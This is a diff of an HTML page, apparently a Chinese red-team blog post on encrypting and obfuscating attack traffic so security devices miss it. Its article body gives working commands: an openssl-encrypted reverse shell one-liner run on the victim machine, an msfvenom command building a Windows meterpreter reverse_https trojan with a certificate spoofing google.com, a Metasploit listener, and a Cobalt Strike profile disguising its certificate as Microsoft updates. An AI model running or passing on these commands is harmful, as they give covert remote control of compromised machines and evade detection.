@@ -1,27 +1,22 @@
 <!DOCTYPE html>
-<html lang="zh-Hans" dir="ltr">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='安全设备逐渐普及的当下，流量传输加密混淆已是优秀红队必备技能。'>
+<html dir="ltr" lang="zh-Hans">
+<head><meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/><meta content="安全设备逐渐普及的当下，流量传输加密混淆已是优秀红队必备技能。" name="description"/>
 <title>流量传输加密混淆</title>
-
-<link rel='canonical' href='https://fragrant1001.github.io/post/2023/encryptedflow/'>
-
-<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='流量传输加密混淆'>
-<meta property='og:description' content='安全设备逐渐普及的当下，流量传输加密混淆已是优秀红队必备技能。'>
-<meta property='og:url' content='https://fragrant1001.github.io/post/2023/encryptedflow/'>
-<meta property='og:site_name' content='fragrant1001'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='流量加密混淆' /><meta property='article:tag' content='红队蓝队' /><meta property='article:published_time' content='2023-11-02T10:02:40&#43;08:00'/><meta property='article:modified_time' content='2023-11-02T10:02:40&#43;08:00'/><meta property='og:image' content='https://fragrant1001.github.io/post/2023/encryptedflow/beacon.jpg' />
-<meta name="twitter:site" content="@fragrant10">
-    <meta name="twitter:creator" content="@fragrant10"><meta name="twitter:title" content="流量传输加密混淆">
-<meta name="twitter:description" content="安全设备逐渐普及的当下，流量传输加密混淆已是优秀红队必备技能。"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://fragrant1001.github.io/post/2023/encryptedflow/beacon.jpg' />
-    <link rel="shortcut icon" href="/img/favicon.ico" />
-
-    </head>
-    <body class="
-    article-page
-    ">
-    <script>
+<link href="https://fragrant1001.github.io/post/2023/encryptedflow/" rel="canonical"/>
+<link href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css" rel="stylesheet"/><meta content="流量传输加密混淆" property="og:title"/>
+<meta content="安全设备逐渐普及的当下，流量传输加密混淆已是优秀红队必备技能。" property="og:description"/>
+<meta content="https://fragrant1001.github.io/post/2023/encryptedflow/" property="og:url"/>
+<meta content="fragrant1001" property="og:site_name"/>
+<meta content="article" property="og:type"/><meta content="Post" property="article:section"/><meta content="流量加密混淆" property="article:tag"/><meta content="红队蓝队" property="article:tag"/><meta content="2023-11-02T10:02:40+08:00" property="article:published_time"/><meta content="2023-11-02T10:02:40+08:00" property="article:modified_time"/><meta content="https://fragrant1001.github.io/post/2023/encryptedflow/beacon.jpg" property="og:image"/>
+<meta content="@fragrant10" name="twitter:site"/>
+<meta content="@fragrant10" name="twitter:creator"/><meta content="流量传输加密混淆" name="twitter:title"/>
+<meta content="安全设备逐渐普及的当下，流量传输加密混淆已是优秀红队必备技能。" name="twitter:description"/><meta content="summary_large_image" name="twitter:card"/>
+<meta content="https://fragrant1001.github.io/post/2023/encryptedflow/beacon.jpg" name="twitter:image"/>
+<link href="/img/favicon.ico" rel="shortcut icon"/>
+</head>
+<body class="article-page">
+<script>
         (function() {
             const colorSchemeKey = 'StackColorScheme';
             if(!localStorage.getItem(colorSchemeKey)){
@@ -43,295 +38,167 @@
         }
     })();
 </script>
-<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header>
-        
-            
-            <figure class="site-avatar">
-                <a href="/">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/IMG_4207_hu343229a556e1793866ec8f94dd379486_169822_300x0_resize_q75_box.JPG" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-                </a>
-                
-            </figure>
-            
-        
-        
-        <div class="site-meta">
-            <h1 class="site-name"><a href="/">fragrant1001</a></h1>
-            <h2 class="site-description">Cyber security engineer...</h2>
-        </div>
-    </header><ol class="social-menu">
-            
-                <li>
-                    <a 
-                        href='https://github.com/fragrant1001'
-                        target="_blank"
-                        title="GitHub"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
+<button aria-label="Toggle Menu" class="hamburger hamburger--spin" id="toggle-menu" type="button">
+<span class="hamburger-box">
+<span class="hamburger-inner"></span>
+</span>
+</button>
+<header>
+<figure class="site-avatar">
+<a href="/">
+<img alt="Avatar" class="site-logo" height="300" loading="lazy" src="/img/IMG_4207_hu343229a556e1793866ec8f94dd379486_169822_300x0_resize_q75_box.JPG" width="300"/>
+</a>
+</figure>
+<div class="site-meta">
+<h1 class="site-name"><a href="/">fragrant1001</a></h1>
+<h2 class="site-description">Cyber security engineer...</h2>
+</div>
+</header><ol class="social-menu">
+<li>
+<a href="https://github.com/fragrant1001" rel="me" target="_blank" title="GitHub">
+<svg class="icon icon-tabler icon-tabler-brand-github" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
+<path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
 </svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-                <li>
-                    <a 
-                        href='https://twitter.com/'
-                        target="_blank"
-                        title="Twitter"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</a>
+</li>
+<li>
+<a href="https://twitter.com/" rel="me" target="_blank" title="Twitter">
+<svg class="icon icon-tabler icon-tabler-brand-twitter" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
+<path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z"></path>
 </svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
-        
-        
-        
-        <li >
-            <a href='/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</a>
+</li>
+</ol><ol class="menu" id="main-menu">
+<li>
+<a href="/">
+<svg class="icon icon-tabler icon-tabler-home" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<polyline points="5 12 3 12 12 3 21 12 19 12"></polyline>
+<path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7"></path>
+<path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6"></path>
 </svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
+<span>Home</span>
+</a>
+</li>
+<li>
+<a href="/archives/">
+<svg class="icon icon-tabler icon-tabler-archive" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<rect height="4" rx="2" width="18" x="3" y="4"></rect>
+<path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10"></path>
+<line x1="10" x2="14" y1="12" y2="12"></line>
 </svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
+<span>Archives</span>
+</a>
+</li>
+<li>
+<a href="/search/">
+<svg class="icon icon-tabler icon-tabler-search" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="10" cy="10" r="7"></circle>
+<line x1="21" x2="15" y1="21" y2="15"></line>
 </svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        <div class="menu-bottom-section">
-            
-            
-                <li id="dark-mode-toggle">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
+<span>Search</span>
+</a>
+</li>
+<div class="menu-bottom-section">
+<li id="dark-mode-toggle">
+<svg class="icon icon-tabler icon-tabler-toggle-left" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="8" cy="12" r="2"></circle>
+<rect height="12" rx="6" width="20" x="2" y="6"></rect>
 </svg>
-
-
-
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
+<svg class="icon icon-tabler icon-tabler-toggle-right" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="16" cy="12" r="2"></circle>
+<rect height="12" rx="6" width="20" x="2" y="6"></rect>
 </svg>
-
-
-
-                    <span>Dark Mode</span>
-                </li>
-            
-        </div>
-    </ol>
+<span>Dark Mode</span>
+</li>
+</div>
+</ol>
 </aside>
-
-    <aside class="sidebar right-sidebar sticky">
-        
-            
-                
-    <section class="widget archives">
-        <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
+<aside class="sidebar right-sidebar sticky">
+<section class="widget archives">
+<div class="widget-icon">
+<svg class="icon icon-tabler icon-tabler-hash" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<line x1="5" x2="19" y1="9" y2="9"></line>
+<line x1="5" x2="19" y1="15" y2="15"></line>
+<line x1="11" x2="7" y1="4" y2="20"></line>
+<line x1="17" x2="13" y1="4" y2="20"></line>
 </svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">Table of contents</h2>
-        
-        <div class="widget--toc">
-            <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#openssl反弹shell">Openssl反弹shell</a></li>
-        <li><a href="#msf流量加密">msf流量加密</a></li>
-        <li><a href="#cs加密混淆">CS加密混淆</a></li>
-      </ul>
-    </li>
-  </ul>
+</div>
+<h2 class="widget-title section-title">Table of contents</h2>
+<div class="widget--toc">
+<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#openssl反弹shell">Openssl反弹shell</a></li>
+<li><a href="#msf流量加密">msf流量加密</a></li>
+<li><a href="#cs加密混淆">CS加密混淆</a></li>
+</ul>
+</li>
+</ul>
 </nav>
-        </div>
-    </section>
-
-            
-        
-    </aside>
-
-
-            <main class="main full-width">
-    <article class="has-image main-article">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/post/2023/encryptedflow/">
-                <img src="/post/2023/encryptedflow/beacon_hu3d03a01dcc18bc5be0e67db3d8d209a6_6071910_800x0_resize_q75_box.jpg"
-                        srcset="/post/2023/encryptedflow/beacon_hu3d03a01dcc18bc5be0e67db3d8d209a6_6071910_800x0_resize_q75_box.jpg 800w, /post/2023/encryptedflow/beacon_hu3d03a01dcc18bc5be0e67db3d8d209a6_6071910_1600x0_resize_q75_box.jpg 1600w"
-                        width="800" 
-                        height="595" 
-                        loading="lazy"
-                        alt="Featured image of post 流量传输加密混淆" />
-                
-            </a>
-        </div>
-    
-
-    <div class="article-details">
-    
-    <header class="article-category">
-        
-            <a href="/categories/encryptedflow/" >
+</div>
+</section>
+</aside>
+<main class="main full-width">
+<article class="has-image main-article">
+<header class="article-header">
+<div class="article-image">
+<a href="/post/2023/encryptedflow/">
+<img alt="Featured image of post 流量传输加密混淆" height="595" loading="lazy" src="/post/2023/encryptedflow/beacon_hu3d03a01dcc18bc5be0e67db3d8d209a6_6071910_800x0_resize_q75_box.jpg" srcset="/post/2023/encryptedflow/beacon_hu3d03a01dcc18bc5be0e67db3d8d209a6_6071910_800x0_resize_q75_box.jpg 800w, /post/2023/encryptedflow/beacon_hu3d03a01dcc18bc5be0e67db3d8d209a6_6071910_1600x0_resize_q75_box.jpg 1600w" width="800"/>
+</a>
+</div>
+<div class="article-details">
+<header class="article-category">
+<a href="/categories/encryptedflow/">
                 encryptedFLow
             </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/post/2023/encryptedflow/">流量传输加密混淆</a>
-        </h2>
-    
-        
-        <h3 class="article-subtitle">
+</header>
+<div class="article-title-wrapper">
+<h2 class="article-title">
+<a href="/post/2023/encryptedflow/">流量传输加密混淆</a>
+</h2>
+<h3 class="article-subtitle">
             安全设备逐渐普及的当下，流量传输加密混淆已是优秀红队必备技能。
         </h3>
-        
-    </div>
-
-    
-    
-    
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
+</div>
+<footer class="article-time">
+<div>
+<svg class="icon icon-tabler icon-tabler-calendar-time" fill="none" height="56" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="56" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4"></path>
+<circle cx="18" cy="18" r="4"></circle>
+<path d="M15 3v4"></path>
+<path d="M7 3v4"></path>
+<path d="M3 11h16"></path>
+<path d="M18 16.496v1.504l1 1"></path>
 </svg>
-                <time class="article-time--published">Nov 02, 2023</time>
-            </div>
-        
-
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
+<time class="article-time--published">Nov 02, 2023</time>
+</div>
+<div>
+<svg class="icon icon-tabler icon-tabler-clock" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="12" cy="12" r="9"></circle>
+<polyline points="12 7 12 12 15 15"></polyline>
 </svg>
-
-
-
-                <time class="article-time--reading">
+<time class="article-time--reading">
                     1 minute read
                 </time>
-            </div>
-        
-    </footer>
-    
-
-    
 </div>
-
+</footer>
+</div>
 </header>
-
-    <section class="article-content">
-    
-    
-    <h3 id="openssl反弹shell">Openssl反弹shell</h3>
-<p>既然是openssl反弹的shell，那么流量自然是加密的。<br>
+<section class="article-content">
+<h3 id="openssl反弹shell">Openssl反弹shell</h3>
+<p>既然是openssl反弹的shell，那么流量自然是加密的。<br/>
 攻击机：</p>
 <pre tabindex="0"><code>//生成自签名证书
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -340,26 +207,13 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port 8989
 </code></pre><p>被攻击机：</p>
 <pre tabindex="0"><code>//反弹shell
 mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.0.0.116:8989 &gt; /tmp/s;rm /tmp/s
-</code></pre><p><img src="/post/2023/encryptedflow/image.png"
-	width="2360"
-	height="1290"
-	srcset="/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="opensslshell"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="182"
-		data-flex-basis="439px"
-	
-></p>
+</code></pre><p><img alt="opensslshell" class="gallery-image" data-flex-basis="439px" data-flex-grow="182" height="1290" loading="lazy" src="/post/2023/encryptedflow/image.png" srcset="/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_1024x0_resize_box_3.png 1024w" width="2360"/></p>
 <h3 id="msf流量加密">msf流量加密</h3>
-<p>首先openssl生成证书，msfvenom生成木马的时候使用该证书。其次攻击机本地设置监听的时候要带上刚刚生成的证书文件。<br>
-攻击机：<br>
+<p>首先openssl生成证书，msfvenom生成木马的时候使用该证书。其次攻击机本地设置监听的时候要带上刚刚生成的证书文件。<br/>
+攻击机：<br/>
 生成木马</p>
 <pre tabindex="0"><code>//openssl生成证书
-openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &#34;/C=UK/ST=London/L=London/O=Development/CN=www.google.com&#34; -keyout www.google.com.key -out www.google.com.crt &amp;&amp; cat www.google.com.key www.google.com.crt &gt; www.google.com.pem &amp;&amp; rm -f www.google.com.key www.google.com.crt
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=UK/ST=London/L=London/O=Development/CN=www.google.com" -keyout www.google.com.key -out www.google.com.crt &amp;&amp; cat www.google.com.key www.google.com.crt &gt; www.google.com.pem &amp;&amp; rm -f www.google.com.key www.google.com.crt
 //msfvenom使用证书生成木马
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.116 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -a x64 --platform windows -o pentestlab.bat
 </code></pre><p>配置加密监听</p>
@@ -370,22 +224,9 @@ set LPORT 443
 set HandlerSSLCert /home/kali/hongri/openssltest/www.google.com.pem
 set StagerVerifySSLCert true
 exploit
-</code></pre><p>被攻击机：<br>
+</code></pre><p>被攻击机：<br/>
 直接运行木马即可
-<img src="/post/2023/encryptedflow/image-1.png"
-	width="2082"
-	height="1334"
-	srcset="/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="加密后的流量"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="156"
-		data-flex-basis="374px"
-	
->
+<img alt="加密后的流量" class="gallery-image" data-flex-basis="374px" data-flex-grow="156" height="1334" loading="lazy" src="/post/2023/encryptedflow/image-1.png" srcset="/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_1024x0_resize_box_3.png 1024w" width="2082"/>
 <code>show advanced</code> 查看高级配置</p>
 <h3 id="cs加密混淆">CS加密混淆</h3>
 <p>Cobalt Strike修改C2 profile</p>
@@ -393,99 +234,47 @@ exploit
 <pre tabindex="0"><code>//生成证书并记住密码和填的字段
 //frasec和frasec.store以及密码等都要要填写到profile文件里面
 keytool -genkey -alias frasec -keyalg RSA -validity 36500 -keystore frasec.store
-</code></pre><p><img src="/post/2023/encryptedflow/image-2.png"
-	width="1788"
-	height="686"
-	srcset="/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="keytool create certification"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="260"
-		data-flex-basis="625px"
-	
-></p>
+</code></pre><p><img alt="keytool create certification" class="gallery-image" data-flex-basis="625px" data-flex-grow="260" height="686" loading="lazy" src="/post/2023/encryptedflow/image-2.png" srcset="/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_1024x0_resize_box_3.png 1024w" width="1788"/></p>
 <p>新建frasec.profile配置文件，主要修改内容：</p>
 <pre tabindex="0"><code>https-certificate {
-    set CN       &#34;Microsoft&#34;; #Common Name
-    set O        &#34;MicrosoftUpdates&#34;; #Organization Name
-    set C        &#34;en&#34;; #Country
-    set L        &#34;US&#34;; #Locality
-    set OU       &#34;MicrosoftUpdates&#34;; #Organizational Unit Name
-    set ST       &#34;US&#34;; #State or Province
-    set validity &#34;36500&#34;; #Number of days the cert is valid for
+    set CN       "Microsoft"; #Common Name
+    set O        "MicrosoftUpdates"; #Organization Name
+    set C        "en"; #Country
+    set L        "US"; #Locality
+    set OU       "MicrosoftUpdates"; #Organizational Unit Name
+    set ST       "US"; #State or Province
+    set validity "36500"; #Number of days the cert is valid for
 }
 
 code-signer{
-    set keystore &#34;frasec.store&#34;;
-    set password &#34;123456&#34;;
-    set alias &#34;frasec&#34;;
+    set keystore "frasec.store";
+    set password "123456";
+    set alias "frasec";
 }
-</code></pre><p>其它内容可做适当更改<br>
+</code></pre><p>其它内容可做适当更改<br/>
 启动服务端</p>
 <pre tabindex="0"><code>sudo ./teamserver 10.0.0.116 pass14 frasec.profile
 </code></pre><p>客户端连接后生成https的木马即可，加密流量如下：</p>
-<p><img src="/post/2023/encryptedflow/image-3.png"
-	width="2436"
-	height="814"
-	srcset="/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="cs encrypted flow"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="299"
-		data-flex-basis="718px"
-	
-></p>
-<p><a class="link" href="https://github.com/rsmudge/Malleable-C2-Profiles"  target="_blank" rel="noopener"
-    >https://github.com/rsmudge/Malleable-C2-Profiles</a></p>
-
+<p><img alt="cs encrypted flow" class="gallery-image" data-flex-basis="718px" data-flex-grow="299" height="814" loading="lazy" src="/post/2023/encryptedflow/image-3.png" srcset="/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_480x0_resize_box_3.png 480w, /post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_1024x0_resize_box_3.png 1024w" width="2436"/></p>
+<p><a class="link" href="https://github.com/rsmudge/Malleable-C2-Profiles" rel="noopener" target="_blank">https://github.com/rsmudge/Malleable-C2-Profiles</a></p>
 </section>
-
-
-    <footer class="article-footer">
-    
-    <section class="article-tags">
-        
-            <a href="/tags/%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86/">流量加密混淆</a>
-        
-            <a href="/tags/%E7%BA%A2%E9%98%9F%E8%93%9D%E9%98%9F/">红队蓝队</a>
-        
-    </section>
-
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+<footer class="article-footer">
+<section class="article-tags">
+<a href="/tags/%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86/">流量加密混淆</a>
+<a href="/tags/%E7%BA%A2%E9%98%9F%E8%93%9D%E9%98%9F/">红队蓝队</a>
+</section>
+<section class="article-copyright">
